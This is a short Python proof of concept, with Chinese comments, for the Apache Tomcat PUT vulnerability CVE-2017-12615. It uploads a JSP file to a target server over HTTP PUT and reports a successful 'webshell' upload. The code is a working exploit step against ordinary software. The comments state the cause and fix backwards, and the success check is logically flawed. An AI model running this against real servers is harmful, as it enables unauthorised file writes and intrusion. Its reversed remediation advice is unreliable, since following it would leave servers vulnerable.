# Author：bamboo
# Time：2022/8/27 13:50
# 大 道 至 简！

import re
import requests
import urllib3
urllib3.disable_warnings()


# Tomcat Put漏洞
# Apache Tomcat 7.0.0 - 7.0.81
# 配置文件readonly为true造成
# 修复方案： 将配置文件readonly值修改为false，重启tomcat即可

def put_Ma(target, port, headers):
    # proxy = {
    #     'http': '127.0.0.1:8080',
    #     'https': '127.0.0.1:8080'
    # }
    data = 'qaxnb111'
    url = f'http://{target}:{port}/qaxnb111.jsp'
    try:
        requests.put(url+'/', headers=headers, data=data, verify=False)
        response = requests.get(url=url, headers=headers, verify=False)
        if response.text in 'qaxnb111':
            print('[+] 存在CVE-2017-12615漏洞，上传webshell成功，url:{}'.format(url))
    except Exception:
        pass


    